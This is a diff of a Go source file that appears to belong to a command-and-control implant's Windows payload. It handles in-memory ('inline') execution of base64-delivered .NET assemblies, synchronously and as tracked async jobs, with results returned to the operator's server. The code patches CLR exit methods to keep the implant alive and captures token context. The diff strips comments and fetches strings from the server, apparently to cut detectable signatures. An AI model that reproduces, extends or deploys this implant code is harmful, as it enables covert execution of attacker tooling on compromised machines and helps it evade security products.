@@ -1,5 +1,3 @@
-// server/docker/payloads/Windows/inline_assembly.go
-
 //go:build windows
 // +build windows
 
@@ -15,7 +13,6 @@ import (
 	"time"
 )
 
-// IATemplate receives string templates from server
 type IATemplate struct {
 	Version   int      `json:"v"`
 	Type      int      `json:"t"`
@@ -23,29 +20,20 @@ type IATemplate struct {
 	Params    []string `json:"p"`
 }
 
-// IA template indices (must match server's common.go)
 const (
-	// Core inline assembly strings (830-843)
-	idxIAOsWindows       = 830 // windows
-	idxIACmdName         = 831 // inline-assembly
-	idxIACmdNameAsync    = 832 // inline-assembly-async
-	idxIATypeExe         = 833 // EXE
-	idxIATypeDll         = 834 // DLL
-	idxIAJobPrefix       = 835 // inline_asm_%d
-	idxIATerminated      = 836 // terminated by user
-	idxIAExitCodeLabel   = 837 // Exit code:
-	idxIAFmtDoneCode     = 838 // \nDone (code: %d)\n
-	idxIAFmtStartedID    = 839 // Started (ID: %s)
+	idxIAOsWindows     = 830
+	idxIACmdName       = 831
+	idxIACmdNameAsync  = 832
+	idxIAJobPrefix     = 835
+	idxIATerminated    = 836
+	idxIAExitCodeLabel = 837
+	idxIAFmtDoneCode   = 838
+	idxIAFmtStartedID  = 839
 )
 
-// Convenience functions for common template strings
-// Note: iaTemplate, iaTemplateMu, iaTpl, and SetInlineAssemblyTemplate
-// are defined in action_inline_assembly.go
 func iaOsWindows() string    { return iaTpl(idxIAOsWindows) }
 func iaCmdName() string      { return iaTpl(idxIACmdName) }
 func iaCmdNameAsync() string { return iaTpl(idxIACmdNameAsync) }
-func iaTypeExe() string      { return iaTpl(idxIATypeExe) }
-func iaTypeDll() string      { return iaTpl(idxIATypeDll) }
 func iaJobPrefix() string    { return iaTpl(idxIAJobPrefix) }
 func iaTerminated() string   { return iaTpl(idxIATerminated) }
 func iaExitCode() string     { return iaTpl(idxIAExitCodeLabel) }
@@ -70,27 +58,25 @@ var (
 func InitializeExitPrevention() {
 	exitPreventionOnce.Do(func() {
 		exitPrevention = NewCLRExitPrevention()
-
-		if err := exitPrevention.PatchAllExitMethods(); err != nil {
-		} else {
+		if err := exitPrevention.PatchAllExitMethods(); err == nil {
 			exitMethodsPatched = true
-			// fmt.Println("[+] Exit prevention initialized successfully")
 		}
 	})
 }
 
-// InlineAssemblyCommand handles synchronous inline .NET assembly execution
 type InlineAssemblyCommand struct{}
 
 func (c *InlineAssemblyCommand) Execute(ctx *CommandContext, args []string) CommandResult {
-	// Parse template from Command.Data if available
 	if ctx.CurrentCommand != nil && ctx.CurrentCommand.Data != "" {
-		decoded, err := base64.StdEncoding.DecodeString(ctx.CurrentCommand.Data)
-		if err == nil {
-			var tpl IATemplate
-			if err := json.Unmarshal(decoded, &tpl); err == nil {
-				// Set shared template for other IA files to use
-				SetInlineAssemblyTemplate(tpl.Templates)
+		var tpl IATemplate
+		if err := json.Unmarshal([]byte(ctx.CurrentCommand.Data), &tpl); err == nil && tpl.Templates != nil {
+			SetInlineAssemblyTemplate(tpl.Templates)
+		} else {
+			decoded, err := base64.StdEncoding.DecodeString(ctx.CurrentCommand.Data)
+			if err == nil {
+				if err := json.Unmarshal(decoded, &tpl); err == nil {
+					SetInlineAssemblyTemplate(tpl.Templates)
+				}
 			}
 		}
 	}
@@ -103,25 +89,19 @@ func (c *InlineAssemblyCommand) Execute(ctx *CommandContext, args []string) Comm
 		}
 	}
 
-	// Track execution count
 	clrExecutionMutex.Lock()
 	clrExecutionCount++
 	executionNumber := clrExecutionCount
 	clrExecutionMutex.Unlock()
 
-	// Initialize exit prevention before any assembly execution
 	InitializeExitPrevention()
 
 	var output strings.Builder
 
-	// Get the command data from context first
 	var configData string
-
 	if ctx.CurrentCommand != nil && ctx.CurrentCommand.Data != "" {
-		// Use the data from the current command context
 		configData = ctx.CurrentCommand.Data
 	} else if len(args) > 0 {
-		// Fall back to args if provided
 		configData = strings.Join(args, " ")
 	} else {
 		return CommandResult{
@@ -130,7 +110,6 @@ func (c *InlineAssemblyCommand) Execute(ctx *CommandContext, args []string) Comm
 		}
 	}
 
-	// Parse the JSON configuration
 	var config struct {
 		AssemblyB64 string   `json:"ab"`
 		Arguments   []string `json:"ar"`
@@ -144,10 +123,8 @@ func (c *InlineAssemblyCommand) Execute(ctx *CommandContext, args []string) Comm
 	}
 
 	if err := json.Unmarshal([]byte(configData), &config); err != nil {
-		// Try to parse as base64 if JSON fails
 		if _, decodeErr := base64.StdEncoding.DecodeString(configData); decodeErr == nil {
 			config.AssemblyB64 = configData
-			// Use remaining args as arguments if they exist
 			if len(args) > 1 {
 				config.Arguments = args[1:]
 			}
@@ -159,7 +136,6 @@ func (c *InlineAssemblyCommand) Execute(ctx *CommandContext, args []string) Comm
 		}
 	}
 
-	// Decode assembly
 	assemblyBytes, err := base64.StdEncoding.DecodeString(config.AssemblyB64)
 	if err != nil {
 		return CommandResult{
@@ -168,17 +144,6 @@ func (c *InlineAssemblyCommand) Execute(ctx *CommandContext, args []string) Comm
 		}
 	}
 
-	// Detect assembly information
-	isDLL := c.isDLLAssembly(assemblyBytes)
-	assemblyType := iaTypeExe()
-	if isDLL {
-		assemblyType = iaTypeDll()
-	}
-
-	// Removed verbose output to reduce binary signatures
-	_ = assemblyType // suppress unused variable warning
-
-	// Execute with protection (this method is defined in action_inline_assembly.go)
 	assemblyOutput, exitCode := c.executeWindowsAssembly(assemblyBytes, config, executionNumber)
 
 	output.WriteString(assemblyOutput)
@@ -189,52 +154,35 @@ func (c *InlineAssemblyCommand) Execute(ctx *CommandContext, args []string) Comm
 	}
 }
 
-// isDLLAssembly checks if the assembly is a DLL
-func (c *InlineAssemblyCommand) isDLLAssembly(assemblyBytes []byte) bool {
-	// Check PE headers to determine if it's a DLL
-	if len(assemblyBytes) < 0x3C+4 {
-		return false
-	}
-
-	// Check for MZ header
-	if assemblyBytes[0] != 'M' || assemblyBytes[1] != 'Z' {
-		return false
-	}
-
-	// Get PE header offset
-	peOffset := int32(assemblyBytes[0x3C]) |
-		int32(assemblyBytes[0x3D])<<8 |
-		int32(assemblyBytes[0x3E])<<16 |
-		int32(assemblyBytes[0x3F])<<24
-
-	if int(peOffset+0x17) >= len(assemblyBytes) {
-		return false
-	}
-
-	// Check characteristics for DLL flag (0x2000)
-	characteristics := uint16(assemblyBytes[peOffset+0x16]) | uint16(assemblyBytes[peOffset+0x17])<<8
-	return (characteristics & 0x2000) != 0
-}
-
 // InlineAssemblyAsyncCommand handles async inline .NET assembly execution
 type InlineAssemblyAsyncCommand struct {
 	InlineAssemblyCommand
 }
 
-// Execute method for InlineAssemblyAsyncCommand to use the new async execution
 func (c *InlineAssemblyAsyncCommand) Execute(ctx *CommandContext, args []string) CommandResult {
-	// Generate a unique job ID
+	if ctx.CurrentCommand != nil && ctx.CurrentCommand.Data != "" {
+		var tpl IATemplate
+		if err := json.Unmarshal([]byte(ctx.CurrentCommand.Data), &tpl); err == nil && tpl.Templates != nil {
+			SetInlineAssemblyTemplate(tpl.Templates)
+		} else {
+			decoded, err := base64.StdEncoding.DecodeString(ctx.CurrentCommand.Data)
+			if err == nil {
+				if err := json.Unmarshal(decoded, &tpl); err == nil {
+					SetInlineAssemblyTemplate(tpl.Templates)
+				}
+			}
+		}
+	}
+
 	jobPrefixFmt := iaJobPrefix()
 	jobID := fmt.Sprintf(jobPrefixFmt, time.Now().UnixNano())
 
-	// Get the current command from context
 	var currentCmd Command
 	if ctx.CurrentCommand != nil {
 		currentCmd = *ctx.CurrentCommand
 		currentCmd.JobID = jobID
 	}
 
-	// Create assembly job for tracking
 	statusRun := iaStatusRun()
 	job := &AssemblyJob{
 		ID:          jobID,
@@ -248,10 +196,8 @@ func (c *InlineAssemblyAsyncCommand) Execute(ctx *CommandContext, args []string)
 		Command:     currentCmd,
 	}
 
-	// Add job to assembly job manager
 	assemblyJobManager.AddJob(job)
 
-	// Also create job info for commandQueue tracking (for compatibility)
 	cmdNameAsync := iaCmdNameAsync()
 	jobInfo := JobInfo{
 		ID:        jobID,
@@ -261,14 +207,12 @@ func (c *InlineAssemblyAsyncCommand) Execute(ctx *CommandContext, args []string)
 		Type:      cmdNameAsync,
 	}
 
-	// Store job info in the global commandQueue
 	if commandQueue != nil {
 		commandQueue.mu.Lock()
 		commandQueue.activeJobs[jobID] = jobInfo
 		commandQueue.mu.Unlock()
 	}
 
-	// Start async execution
 	go func() {
 		defer func() {
 			if r := recover(); r != nil {
@@ -283,7 +227,6 @@ func (c *InlineAssemblyAsyncCommand) Execute(ctx *CommandContext, args []string)
 				finalOutput := job.Output.String()
 				job.OutputMutex.Unlock()
 
-				// Send crash result
 				crashResult := CommandResult{
 					Output:      finalOutput,
 					Error:       job.Error,
@@ -297,7 +240,6 @@ func (c *InlineAssemblyAsyncCommand) Execute(ctx *CommandContext, args []string)
 			}
 		}()
 
-		// Parse the assembly config
 		var config struct {
 			AssemblyB64 string   `json:"ab"`
 			Arguments   []string `json:"ar"`
@@ -310,7 +252,6 @@ func (c *InlineAssemblyAsyncCommand) Execute(ctx *CommandContext, args []string)
 			PipeName    string   `json:"pm"`
 		}
 
-		// Parse from the Data field
 		if currentCmd.Data != "" {
 			if err := json.Unmarshal([]byte(currentCmd.Data), &config); err != nil {
 				job.OutputMutex.Lock()
@@ -326,7 +267,6 @@ func (c *InlineAssemblyAsyncCommand) Execute(ctx *CommandContext, args []string)
 			}
 		}
 
-		// Decode assembly
 		assemblyBytes, err := base64.StdEncoding.DecodeString(config.AssemblyB64)
 		if err != nil {
 			job.OutputMutex.Lock()
@@ -340,15 +280,11 @@ func (c *InlineAssemblyAsyncCommand) Execute(ctx *CommandContext, args []string)
 			return
 		}
 
-		// Execute with async capture
 		var exitCode int
-
 		if runtime.GOOS == "windows" {
-			// Use the Windows-specific async method
 			tokenContext := captureCurrentAssemblyTokenContext()
 			exitCode, err = c.executeWindowsAssemblyAsync(assemblyBytes, config, job, tokenContext)
 		} else {
-			// Fail on non-Windows platforms
 			err = fmt.Errorf(Err(E2))
 			exitCode = -1
 			job.OutputMutex.Lock()
@@ -356,7 +292,6 @@ func (c *InlineAssemblyAsyncCommand) Execute(ctx *CommandContext, args []string)
 			job.OutputMutex.Unlock()
 		}
 
-		// Update job status based on result
 		job.OutputMutex.Lock()
 		endTime := time.Now()
 		job.EndTime = &endTime
@@ -388,7 +323,6 @@ func (c *InlineAssemblyAsyncCommand) Execute(ctx *CommandContext, args []string)
 		finalOutput := job.Output.String()
 		job.OutputMutex.Unlock()
 
-		// Mark job as complete in commandQueue
 		if commandQueue != nil {
 			commandQueue.mu.Lock()
 			if queueJob, exists := commandQueue.activeJobs[jobID]; exists {
@@ -398,22 +332,16 @@ func (c *InlineAssemblyAsyncCommand) Execute(ctx *CommandContext, args []string)
 			commandQueue.mu.Unlock()
 		}
 
-		// CRITICAL: Send final result back to server
-		// We need to include the Command data for the server to identify this result
 		finalResult := CommandResult{
-			Command:     currentCmd, // Include the command so server knows what this is for
+			Command:     currentCmd,
 			Output:      finalOutput,
 			ExitCode:    exitCode,
 			CompletedAt: time.Now().Format(time.RFC3339),
 			JobID:       jobID,
 		}
 
-		// Send the result back through the result manager
 		if resultManager != nil {
-			if err := resultManager.AddResult(&finalResult); err != nil {
-			} else {
-			}
-		} else {
+			resultManager.AddResult(&finalResult)
 		}
 
 	}()
